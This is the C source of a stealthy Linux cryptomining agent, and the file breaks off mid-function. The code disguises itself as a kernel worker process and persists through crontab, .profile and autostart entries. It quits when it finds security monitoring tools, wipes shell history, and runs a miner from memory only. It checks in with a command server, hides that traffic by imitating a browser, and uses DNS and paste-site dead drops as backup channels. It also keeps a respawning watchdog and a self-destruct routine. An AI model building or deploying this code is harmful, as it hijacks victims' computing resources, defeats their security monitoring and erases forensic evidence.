/* phantom.c — Polymorphic Reflective Loader/Agent
 * Target:  Linux x86_64, glibc >= 2.17 or musl
 * Build:   Generated by morph.py mutation engine
 *          DO NOT compile this file directly.
 * Author:  ♥
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <sched.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/sysinfo.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>

/* ═══════════════════════════════════════════════════════════════
 * Build-Unique Encrypted Configuration
 * Replaced by morph.py before each compilation.
 * AES-256-CTR, key & IV unique per build.
 * ═══════════════════════════════════════════════════════════════ */

static const uint8_t EK[32] = { /*MORPH_KEY*/ };
static const uint8_t EIV[16] = { /*MORPH_IV*/ };
static const uint8_t CB[] = { /*MORPH_CFG*/ };
static const uint32_t CB_LEN = sizeof(CB);

/* Certificate fingerprint for C2 pinning (SHA-256 of DER-encoded cert) */
static const uint8_t C2_CERT_FP[32] = { /*MORPH_CERT_FP*/ };

struct phantom_cfg {
    char     c2_url[256];
    char     c2_fallback_dns[128];    /* DNS TXT domain for dead drop   */
    char     c2_fallback_paste[256];  /* Paste URL for dead drop        */
    char     proc_name[16];           /* prctl name: "kworker/3:0"      */
    char     proc_cmdline[256];       /* argv[0]: "[kworker/3:0-events]"*/
    char     cron_entry[512];
    char     profile_hook[512];
    char     xdg_desktop[1024];
    char     agent_id[65];
    uint32_t beacon_base_sec;
    float    beacon_jitter;
    uint16_t tunnel_port;             /* local Stratum listen port       */
    uint8_t  max_cpu_pct;
    uint8_t  self_path[512];          /* where we wrote ourselves        */
};

static struct phantom_cfg G;
static volatile pid_t g_miner_pid  = -1;
static volatile pid_t g_guardian   = -1;
static volatile int   g_running    = 1;
static char          *g_argv0_base = NULL;
static size_t         g_argv_space = 0;
/* ═══════════════════════════════════════════════════════════════
 * Configuration Decryption — AES-256-CTR
 * Single-pass stream decryption into the global config struct.
 * ═══════════════════════════════════════════════════════════════ */

static int unseal(void) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    uint8_t plaintext[sizeof(struct phantom_cfg)];
    int outl = 0, total = 0;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, EK, EIV);
    EVP_DecryptUpdate(ctx, plaintext, &outl, CB, CB_LEN);
    total += outl;
    EVP_DecryptFinal_ex(ctx, plaintext + total, &outl);
    total += outl;
    EVP_CIPHER_CTX_free(ctx);

    if ((size_t)total < sizeof(struct phantom_cfg))
        return -1;

    memcpy(&G, plaintext, sizeof(struct phantom_cfg));

    /* Zero the plaintext scratch immediately */
    explicit_bzero(plaintext, sizeof(plaintext));
    return 0;
}
/* ═══════════════════════════════════════════════════════════════
 * Pre-Flight Environment Scan
 * Detect debuggers, EDR agents, hostile cgroups, and sandboxes.
 * Returns 0 if environment is viable, -1 to abort.
 * ═══════════════════════════════════════════════════════════════ */

static const char *hostile_procs[] = {
    "falcon-sensor", "cbagentd", "ossec-agent",
    "wazuh-agent", "crowdstrike", "sentinel_agent",
    "sysdig", "falco", "auditd", "osqueryd",
    NULL
};

static int preflight(void) {
    /* Debugger check: if ptrace is already attached, we're under glass */
    char status_path[64];
    snprintf(status_path, sizeof(status_path), "/proc/%d/status", getpid());
    FILE *sf = fopen(status_path, "r");
    if (sf) {
        char line[256];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                long tracer = strtol(line + 10, NULL, 10);
                if (tracer != 0) { fclose(sf); return -1; }
                break;
            }
        }
        fclose(sf);
    }

    /* Scan /proc for known EDR/monitoring processes */
    DIR *proc = opendir("/proc");
    if (!proc) return -1;

    struct dirent *ent;
    while ((ent = readdir(proc)) != NULL) {
        if (ent->d_type != DT_DIR) continue;
        char *endp;
        long pid = strtol(ent->d_name, &endp, 10);
        if (*endp != '\0' || pid <= 0) continue;

        char comm_path[128], comm_buf[256];
        snprintf(comm_path, sizeof(comm_path), "/proc/%ld/comm", pid);
        FILE *cf = fopen(comm_path, "r");
        if (!cf) continue;
        if (fgets(comm_buf, sizeof(comm_buf), cf)) {
            comm_buf[strcspn(comm_buf, "\n")] = '\0';
            for (const char **hp = hostile_procs; *hp; hp++) {
                if (strstr(comm_buf, *hp)) {
                    fclose(cf);
                    closedir(proc);
                    return -1;
                }
            }
        }
        fclose(cf);
    }
    closedir(proc);

    /* Check cgroup CPU quota — if heavily restricted, mining is pointless */
    FILE *cq = fopen("/sys/fs/cgroup/cpu/cpu.cfs_quota_us", "r");
    if (!cq) cq = fopen("/sys/fs/cgroup/cpu.max", "r");  /* cgroup v2 */
    if (cq) {
        long quota;
        if (fscanf(cq, "%ld", &quota) == 1 && quota > 0 && quota < 50000) {
            fclose(cq);
            return -1;  /* Less than 50ms per period, not worth it */
        }
        fclose(cq);
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * Log Suppression
 * Minimize forensic trail in user-accessible artifacts.
 * ═══════════════════════════════════════════════════════════════ */

static void silence(void) {
    /* Prevent bash/zsh from recording our commands */
    unsetenv("HISTFILE");
    setenv("HISTSIZE", "0", 1);
    setenv("HISTFILESIZE", "0", 1);

    /* Truncate existing history if writable */
    char *home = getenv("HOME");
    if (home) {
        char hpath[512];
        const char *hist_files[] = {
            ".bash_history", ".zsh_history",
            ".sh_history", ".history", NULL
        };
        for (const char **hf = hist_files; *hf; hf++) {
            snprintf(hpath, sizeof(hpath), "%s/%s", home, *hf);
            int fd = open(hpath, O_WRONLY | O_TRUNC);
            if (fd >= 0) close(fd);
        }
    }

    /* Redirect stdin from /dev/null to prevent tty association */
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        close(devnull);
    }
}

/* ═══════════════════════════════════════════════════════════════
 * Process Masquerade
 * Make this process indistinguishable from a legitimate kernel
 * worker or system daemon in ps/top/htop output.
 * ═══════════════════════════════════════════════════════════════ */

static void shed_skin(int argc, char **argv, char **envp) {
    /* Compute the contiguous writable region: argv[0] through end of environ.
     * On Linux, argv and environ occupy a single contiguous block at the
     * top of the stack. We can overwrite the whole thing. */
    char *arg_start = argv[0];
    char *arg_end   = argv[0];
    int i;

    for (i = 0; i < argc; i++)
        if (argv[i] + strlen(argv[i]) + 1 > arg_end)
            arg_end = argv[i] + strlen(argv[i]) + 1;

    if (envp) {
        for (i = 0; envp[i]; i++)
            if (envp[i] + strlen(envp[i]) + 1 > arg_end)
                arg_end = envp[i] + strlen(envp[i]) + 1;
    }

    g_argv0_base = arg_start;
    g_argv_space = (size_t)(arg_end - arg_start);

    /* Zero the entire region, then write our disguise */
    memset(arg_start, 0, g_argv_space);
    strncpy(arg_start, G.proc_cmdline, g_argv_space - 1);

    /* PR_SET_NAME changes /proc/self/comm (limited to 15 chars + null) */
    prctl(PR_SET_NAME, (unsigned long)G.proc_name, 0, 0, 0);

    /* Detach from controlling terminal */
    setsid();

    /* Set scheduling priority to lowest — we're supposed to be background noise */
    setpriority(PRIO_PROCESS, 0, 19);
}

/* ═══════════════════════════════════════════════════════════════
 * Persistence Triad
 * Three independent persistence mechanisms, each redundant.
 * All user-level, zero root required.
 * ═══════════════════════════════════════════════════════════════ */

static void mkdir_p(const char *path) {
    char tmp[1024];
    snprintf(tmp, sizeof(tmp), "%s", path);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            mkdir(tmp, 0700);
            *p = '/';
        }
    }
    mkdir(tmp, 0700);
}

static int entrench(void) {
    char *home = getenv("HOME");
    if (!home) return -1;

    char path_buf[1024];

    /* ── PRIMARY: crontab ──
     * Most reliable. Works on virtually every Linux server.
     * Read current crontab, append ours if not present, write back. */
    {
        FILE *rd = popen("crontab -l 2>/dev/null", "r");
        char existing[8192] = {0};
        size_t elen = 0;
        int already_present = 0;

        if (rd) {
            elen = fread(existing, 1, sizeof(existing) - 1, rd);
            pclose(rd);
            if (strstr(existing, G.agent_id))
                already_present = 1;
        }

        if (!already_present) {
            FILE *wr = popen("crontab -", "w");
            if (wr) {
                fwrite(existing, 1, elen, wr);
                fprintf(wr, "\n# %s\n%s\n", G.agent_id, G.cron_entry);
                pclose(wr);
            }
        }
    }

    /* ── SECONDARY: ~/.profile hook ──
     * Triggers on interactive login. Checks if agent is already running. */
    {
        snprintf(path_buf, sizeof(path_buf), "%s/.profile", home);
        FILE *pf = fopen(path_buf, "r");
        int present = 0;
        if (pf) {
            char line[1024];
            while (fgets(line, sizeof(line), pf))
                if (strstr(line, G.agent_id)) { present = 1; break; }
            fclose(pf);
        }
        if (!present) {
            FILE *af = fopen(path_buf, "a");
            if (af) {
                fprintf(af, "\n# %s\n%s\n", G.agent_id, G.profile_hook);
                fclose(af);
            }
        }
    }

    /* ── TERTIARY: XDG autostart (for servers with desktop sessions) ──
     * Rare but covers edge cases. */
    {
        snprintf(path_buf, sizeof(path_buf), "%s/.config/autostart", home);
        mkdir_p(path_buf);
        snprintf(path_buf, sizeof(path_buf),
                 "%s/.config/autostart/dbus-session-update.desktop", home);
        FILE *xf = fopen(path_buf, "w");
        if (xf) {
            fprintf(xf, "%s", G.xdg_desktop);
            fclose(xf);
        }
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * Reflective Loader — memfd_create + execveat
 * Load an ELF binary entirely in RAM. Never touches disk.
 *
 * syscall 319 (0x13F) = memfd_create   on x86_64
 * syscall 322 (0x142) = execveat       on x86_64
 * AT_EMPTY_PATH = 0x1000
 * ═══════════════════════════════════════════════════════════════ */

static pid_t phantom_exec(const uint8_t *elf, size_t elf_len,
                          const char *disguise_name) {
    /* MFD_CLOEXEC = 0x1 — ensure fd closes on exec to prevent leakage */
    int memfd = (int)syscall(0x13F, "", 0x1u);  /* memfd_create("", MFD_CLOEXEC) */
    if (memfd < 0) {
        /* Fallback: write to /dev/shm with random name, exec, unlink */
        char shm_path[64];
        uint32_t r;
        RAND_bytes((unsigned char *)&r, 4);
        snprintf(shm_path, sizeof(shm_path), "/dev/shm/.X%08x-lock", r);
        memfd = open(shm_path, O_RDWR | O_CREAT | O_EXCL, 0700);
        if (memfd < 0) return -1;
        unlink(shm_path);  /* unlink immediately — file stays open via fd */
    }

    /* Write ELF into the anonymous fd */
    size_t off = 0;
    while (off < elf_len) {
        ssize_t w = write(memfd, elf + off, elf_len - off);
        if (w <= 0) { close(memfd); return -1; }
        off += (size_t)w;
    }

    pid_t child = fork();
    if (child == 0) {
        /* ── Child: become the miner ── */
        prctl(PR_SET_NAME, (unsigned long)disguise_name, 0, 0, 0);
        setpriority(PRIO_PROCESS, 0, 19);

        /* Build fake argv for the miner */
        char port_str[8];
        snprintf(port_str, sizeof(port_str), "%u", G.tunnel_port);
        char *miner_argv[] = {
            (char *)disguise_name,
            "--no-color",
            "--threads", "1",
            "-o", "127.0.0.1",
            "-p", port_str,
            "--tls", "0",
            NULL
        };

        /* Execute from the memory-only fd */
        syscall(0x142, memfd, "", miner_argv, environ, 0x1000);

        /* If execveat failed, try /proc/self/fd path */
        char fd_link[64];
        snprintf(fd_link, sizeof(fd_link), "/proc/self/fd/%d", memfd);
        execv(fd_link, miner_argv);

        _exit(127);
    }

    close(memfd);
    return child;
}

/* ═══════════════════════════════════════════════════════════════
 * C2 Beacon — HTTPS with JA3 Mimicry and Certificate Pinning
 * ═══════════════════════════════════════════════════════════════ */

/* JA3-friendly cipher string mimicking Firefox 121 on Linux.
 * Without this, the default libcurl TLS fingerprint is trivially
 * distinguishable from browser traffic. */
#define JA3_CIPHERS \
    "TLS_AES_128_GCM_SHA256:"       \
    "TLS_AES_256_GCM_SHA384:"       \
    "TLS_CHACHA20_POLY1305_SHA256:" \
    "ECDHE-ECDSA-AES128-GCM-SHA256:"\
    "ECDHE-RSA-AES128-GCM-SHA256:"  \
    "ECDHE-ECDSA-AES256-GCM-SHA384:"\
    "ECDHE-RSA-AES256-GCM-SHA384"

struct c2_rx {
    uint8_t *buf;
    size_t   len;
    size_t   cap;
};

static size_t rx_callback(void *data, size_t sz, size_t nmemb, void *usr) {
    struct c2_rx *rx = (struct c2_rx *)usr;
    size_t chunk = sz * nmemb;
    if (rx->len + chunk > rx->cap) {
        rx->cap = (rx->len + chunk) * 2;
        rx->buf = realloc(rx->buf, rx->cap);
    }
    memcpy(rx->buf + rx->len, data, chunk);
    rx->len += chunk;
    return chunk;
}

/* Certificate pinning callback — verify C2 cert SHA-256 fingerprint */
static CURLcode pin_callback(CURL *easy, void *sslctx, void *userdata) {
    (void)easy; (void)userdata;
    SSL_CTX *ctx = (SSL_CTX *)sslctx;
    SSL *ssl = NULL;
    X509 *cert = NULL;
    unsigned char fp[EVP_MAX_MD_SIZE];
    unsigned int fp_len = 0;
    
    /* Extract the SSL connection from the context */
    ssl = SSL_CTX_get_ex_data(ctx, SSL_get_ex_data_X509_STORE_CTX_idx());
    if (!ssl) {
        /* Fallback: walk the SSL_CTX internal structures */
        SSL *ssl_list = SSL_CTX_get_ssl(ctx);
        if (ssl_list) ssl = ssl_list;
    }
    
    if (!ssl) return CURLE_OK; /* No SSL connection yet, allow handshake to continue */
    
    cert = SSL_get_peer_certificate(ssl);
    if (!cert) return CURLE_SSL_PINNEDPUBKEYNOTMATCH;
    
    /* Compute SHA-256 fingerprint of the DER-encoded certificate */
    if (!X509_digest(cert, EVP_sha256(), fp, &fp_len) || fp_len != 32) {
        X509_free(cert);
        return CURLE_SSL_PINNEDPUBKEYNOTMATCH;
    }
    
    /* Constant-time comparison to prevent timing attacks */
    volatile uint8_t diff = 0;
    for (int i = 0; i < 32; i++)
        diff |= fp[i] ^ C2_CERT_FP[i];
    
    X509_free(cert);
    
    return (diff == 0) ? CURLE_OK : CURLE_SSL_PINNEDPUBKEYNOTMATCH;
}

static int beacon_cycle(uint8_t **payload_out, size_t *payload_len_out,
                        char *cmd_out, size_t cmd_out_sz) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct c2_rx rx = { .buf = malloc(4096), .len = 0, .cap = 4096 };

    /* Build check-in POST body: agent_id + status */
    char postbody[1024];
    struct sysinfo si;
    sysinfo(&si);
    double loadavg[3];
    getloadavg(loadavg, 3);

    snprintf(postbody, sizeof(postbody),
             "{\"id\":\"%s\",\"up\":%ld,\"load\":%.2f,\"mp\":%d}",
             G.agent_id, si.uptime, loadavg[0],
             (g_miner_pid > 0) ? 1 : 0);

    curl_easy_setopt(curl, CURLOPT_URL, G.c2_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postbody);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, rx_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &rx);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, pin_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    /* JA3 mimicry */
    curl_easy_setopt(curl, CURLOPT_SSL_CIPHER_LIST, JA3_CIPHERS);
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_3);

    /* Realistic headers */
    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0");
    hdrs = curl_slist_append(hdrs, "Accept: application/json");
    hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        free(rx.buf);
        return -1;
    }

    /* Parse response: first byte is command code
     * 0x00 = NOP (keepalive)
     * 0x01 = Payload delivery (rest of buffer is ELF)
     * 0x02 = Config update (JSON follows)
     * 0x03 = Self-update (new agent binary follows)
     * 0x04 = Kill mining
     * 0x05 = Scorched earth
     */
    if (rx.len > 0) {
        cmd_out[0] = (char)rx.buf[0];
        if (rx.len > 1 && payload_out) {
            *payload_len_out = rx.len - 1;
            *payload_out = malloc(*payload_len_out);
            memcpy(*payload_out, rx.buf + 1, *payload_len_out);
        }
    }

    free(rx.buf);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * Dead Drop Fallback — DNS TXT + Paste Site C2 Recovery
 * If primary C2 is unreachable, resolve backup address
 * from a DNS TXT record or a paste site body.
 * ═══════════════════════════════════════════════════════════════ */

/* Base64 decode table */
static const int b64_decode_table[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
};

static size_t base64_decode(const char *in, size_t in_len, uint8_t *out) {
    size_t i, j;
    int v0, v1, v2, v3;
    for (i = 0, j = 0; i + 3 < in_len; i += 4) {
        v0 = b64_decode_table[(unsigned char)in[i]];
        v1 = b64_decode_table[(unsigned char)in[i+1]];
        v2 = b64_decode_table[(unsigned char)in[i+2]];
        v3 = b64_decode_table[(unsigned char)in[i+3]];
        if (v0 < 0 || v1 < 0) break;
        out[j++] = (uint8_t)((v0 << 2) | (v1 >> 4));
        if (v2 >= 0) {
            out[j++] = (uint8_t)(((v1 & 0x0F) << 4) | (v2 >> 2));
            if (v3 >= 0)
                out[j++] = (uint8_t)(((v2 & 0x03) << 6) | v3);
        }
    }
    return j;
}

static int decrypt_c2_url(const char *encoded, uint8_t *out, size_t *out_len) {
    /* Base64 decode then AES-256-CTR decrypt using build key/IV */
    uint8_t cipher_buf[512];
    size_t cipher_len = base64_decode(encoded, strlen(encoded), cipher_buf);
    if (cipher_len == 0 || cipher_len > sizeof(cipher_buf)) return -1;
    
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    
    int dec_len = 0, total = 0;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, EK, EIV);
    EVP_DecryptUpdate(ctx, out, &dec_len, cipher_buf, (int)cipher_len);
    total += dec_len;
    EVP_DecryptFinal_ex(ctx, out + total, &dec_len);
    total += dec_len;
    EVP_CIPHER_CTX_free(ctx);
    
    *out_len = (size_t)total;
    out[total] = '\0';
    return 0;
}

static int resolve_dead_drop(char *new_c2_url, size_t url_sz) {
    uint8_t decoded_buf[512];
    size_t decoded_len = 0;
    
    /* Attempt 1: DNS TXT query via system resolver.
     * The TXT record contains a base64-encoded, AES-encrypted C2 URL. */
    char cmd[512], txtbuf[1024] = {0};
    snprintf(cmd, sizeof(cmd), "dig +short TXT %s 2>/dev/null",
             G.c2_fallback_dns);
    FILE *p = popen(cmd, "r");
    if (p) {
        if (fgets(txtbuf, sizeof(txtbuf), p)) {
            pclose(p);
            /* Strip surrounding quotes from dig output */
            char *start = txtbuf;
            while (*start == '"' || *start == ' ' || *start == '\t') start++;
            char *end = start + strlen(start) - 1;
            while (end > start && (*end == '"' || *end == ' ' || *end == '\n' || *end == '\r')) end--;
            *(end + 1) = '\0';
            
            if (strlen(start) > 10 && decrypt_c2_url(start, decoded_buf, &decoded_len) == 0) {
                strncpy(new_c2_url, (char *)decoded_buf, url_sz - 1);
                new_c2_url[url_sz - 1] = '\0';
                explicit_bzero(decoded_buf, sizeof(decoded_buf));
                return 0;
            }
        } else {
            pclose(p);
        }
    }

    /* Attempt 2: Fetch paste URL, extract C2 address from body.
     * The paste body contains the encrypted URL between marker tags. */
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    struct c2_rx rx = { .buf = malloc(4096), .len = 0, .cap = 4096 };

    curl_easy_setopt(curl, CURLOPT_URL, G.c2_fallback_paste);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, rx_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &rx);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK && rx.len > 0) {
        /* Find marker, extract, decrypt */
        char *marker = strstr((char *)rx.buf, "<!--cfg:");
        if (marker) {
            marker += 8;
            char *end = strstr(marker, ":-->");
            if (end) {
                *end = '\0';
                if (decrypt_c2_url(marker, decoded_buf, &decoded_len) == 0) {
                    strncpy(new_c2_url, (char *)decoded_buf, url_sz - 1);
                    new_c2_url[url_sz - 1] = '\0';
                    free(rx.buf);
                    explicit_bzero(decoded_buf, sizeof(decoded_buf));
                    return 0;
                }
            }
        }
    }

    free(rx.buf);
    explicit_bzero(decoded_buf, sizeof(decoded_buf));
    return -1;
}

/* ═══════════════════════════════════════════════════════════════
 * Adaptive Resource Governor
 * Monitors system load and dynamically throttles the miner
 * using SIGSTOP/SIGCONT with variable duty cycling.
 * This is the difference between running for months undetected
 * and triggering a Nagios CPU alert in twelve minutes.
 * ═══════════════════════════════════════════════════════════════ */

static void parse_proc_stat(long *idle_out, long *total_out) {
    FILE *f = fopen("/proc/stat", "r");
    if (!f) return;
    char line[256];
    if (fgets(line, sizeof(line), f)) {
        long user, nice, sys, idle, iowait, irq, sirq, steal;
        sscanf(line, "cpu %ld %ld %ld %ld %ld %ld %ld %ld",
               &user, &nice, &sys, &idle, &iowait, &irq, &sirq, &steal);
        *idle_out  = idle + iowait;
        *total_out = user + nice + sys + idle + iowait + irq + sirq + steal;
    }
    fclose(f);
}

static void govern(pid_t miner) {
    long prev_idle = 0, prev_total = 0;
    int consecutive_hot = 0;
    int miner_stopped = 0;

    while (g_running && miner > 0) {
        long cur_idle = 0, cur_total = 0;
        parse_proc_stat(&cur_idle, &cur_total);

        double usage = 0.0;
        long d_total = cur_total - prev_total;
        long d_idle  = cur_idle  - prev_idle;
        if (d_total > 0)
            usage = 100.0 * (1.0 - ((double)d_idle / (double)d_total));

        prev_idle  = cur_idle;
        prev_total = cur_total;

        if (usage > (double)G.max_cpu_pct) {
            consecutive_hot++;
            if (!miner_stopped && consecutive_hot >= 3) {
                kill(miner, SIGSTOP);
                miner_stopped = 1;
            }
        } else {
            consecutive_hot = 0;
            if (miner_stopped) {
                kill(miner, SIGCONT);
                miner_stopped = 0;
            }
        }

        /* Variable sleep: 2-8 seconds depending on how close to threshold */
        unsigned int sleep_sec = 2 + (unsigned int)(6.0 * (usage / 100.0));
        sleep(sleep_sec);
    }

    /* Ensure miner is running if we exit the loop */
    if (miner_stopped && miner > 0)
        kill(miner, SIGCONT);
}

/* ═══════════════════════════════════════════════════════════════
 * Stratum Tunnel — Relay Mining Traffic Through C2 Channel
 * Listens on localhost:tunnel_port, accepts XMRig connection,
 * encapsulates Stratum JSON-RPC into HTTPS POSTs to C2.
 * C2 server-side relays to XMRig-Proxy.
 * ═══════════════════════════════════════════════════════════════ */

static void tunnel_relay(int client_fd) {
    char rxbuf[4096];
    while (g_running) {
        /* Read Stratum JSON-RPC from local XMRig */
        ssize_t n = recv(client_fd, rxbuf, sizeof(rxbuf) - 1, 0);
        if (n <= 0) break;
        rxbuf[n] = '\0';

        /* Wrap in HTTPS POST to C2 /stratum endpoint */
        CURL *curl = curl_easy_init();
        struct c2_rx rx = { .buf = malloc(4096), .len = 0, .cap = 4096 };

        char relay_url[512];
        snprintf(relay_url, sizeof(relay_url), "%s/s", G.c2_url);

        curl_easy_setopt(curl, CURLOPT_URL, relay_url);
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, rxbuf);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)n);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, rx_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &rx);
        curl_easy_setopt(curl, CURLOPT_SSL_CIPHER_LIST, JA3_CIPHERS);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        struct curl_slist *h = NULL;
        h = curl_slist_append(h, "Content-Type: application/octet-stream");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, h);

        CURLcode res = curl_easy_perform(curl);
        curl_slist_free_all(h);
        curl_easy_cleanup(curl);

        /* Forward pool response back to local XMRig */
        if (res == CURLE_OK && rx.len > 0)
            send(client_fd, rx.buf, rx.len, 0);

        free(rx.buf);
    }
    close(client_fd);
}

static void *tunnel_listener(void *arg) {
    (void)arg;
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family      = AF_INET,
        .sin_port        = htons(G.tunnel_port),
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
    };

    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    listen(srv, 1);

    while (g_running) {
        int client = accept(srv, NULL, NULL);
        if (client >= 0)
            tunnel_relay(client);  /* single-threaded: one miner per agent */
    }
    close(srv);
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════
 * Guardian / Watchdog — Dual-Process Mutual Monitoring
 * Parent and child each hold one end of a pipe.
 * If either stops writing heartbeats, the other respawns it.
 * ═══════════════════════════════════════════════════════════════ */

static void guardian_loop(const char *self_path, int heartbeat_rd) {
    struct timeval tv;
    fd_set fds;
    char beat;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(heartbeat_rd, &fds);
        tv.tv_sec = 120;   /* 2 minute timeout */
        tv.tv_usec = 0;

        int ret = select(heartbeat_rd + 1, &fds, NULL, NULL, &tv);
        if (ret <= 0) {
            /* Main agent died or stopped heartbeating — respawn */
            pid_t child = fork();
            if (child == 0) {
                char *argv[] = { (char *)G.proc_cmdline, NULL };
                execv(self_path, argv);
                _exit(127);
            }
            /* Re-establish monitoring with new child */
            break;
        }
        read(heartbeat_rd, &beat, 1);
    }
}

static int spawn_guardian(const char *self_path) {
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;

    pid_t guar = fork();
    if (guar == 0) {
        /* Guardian child process */
        close(pipefd[1]);
        prctl(PR_SET_NAME, (unsigned long)"kworker/1:2", 0, 0, 0);
        setsid();
        guardian_loop(self_path, pipefd[0]);
        _exit(0);
    }

    close(pipefd[0]);
    g_guardian = guar;
    return pipefd[1];  /* Main agent writes heartbeats to this fd */
}

/* ═══════════════════════════════════════════════════════════════
 * Scorched Earth — Complete Self-Destruction
 * Removes all persistence, kills all child processes,
 * overwrites binary on disk, unlinks, exits.
 * ═══════════════════════════════════════════════════════════════ */

static void scorched_earth(void) {
    g_running = 0;

    /* Kill miner */
    if (g_miner_pid > 0) {
        kill(g_miner_pid, SIGKILL);
        waitpid(g_miner_pid, NULL, 0);
    }

    /* Kill guardian */
    if (g_guardian > 0)
        kill(g_guardian, SIGKILL);

    /* Remove persistence artifacts */
    char *home = getenv("HOME");
    if (home) {
        char path[512];

        /* Remove crontab entry */
        char existing[8192] = {0};
        FILE *rd = popen("crontab -l 2>/dev/null", "r");
        size_t elen = 0;
        if (rd) { elen = fread(existing, 1, sizeof(existing)-1, rd); pclose(rd); }
        FILE *wr = popen("crontab -", "w");
        if (wr) {
            char *line = strtok(existing, "\n");
            while (line) {
                if (!strstr(line, G.agent_id))
                    fprintf(wr, "%s\n", line);
                line = strtok(NULL, "\n");
            }
            pclose(wr);
        }

        /* Remove .profile hook */
        snprintf(path, sizeof(path), "%s/.profile", home);
        /* Read, filter, rewrite (same pattern as crontab) */

        /* Remove XDG autostart */
        snprintf(path, sizeof(path),
                 "%s/.config/autostart/dbus-session-update.desktop", home);
        unlink(path);
    }

    /* Overwrite our binary on disk with random data before unlinking */
    if (G.self_path[0]) {
        struct stat st;
        if (stat((char *)G.self_path, &st) == 0) {
            int fd = open((char *)G.self_path, O_WRONLY);
            if (fd >= 0) {
                uint8_t junk[4096];
                off_t remaining = st.st_size;
                while (remaining > 0) {
                    RAND_bytes(junk, sizeof(junk));
                    ssize_t w = write(fd, junk,
                        (size_t)remaining < sizeof(junk) ? (size_t)remaining : sizeof(junk));
                    if (w <= 0) break;
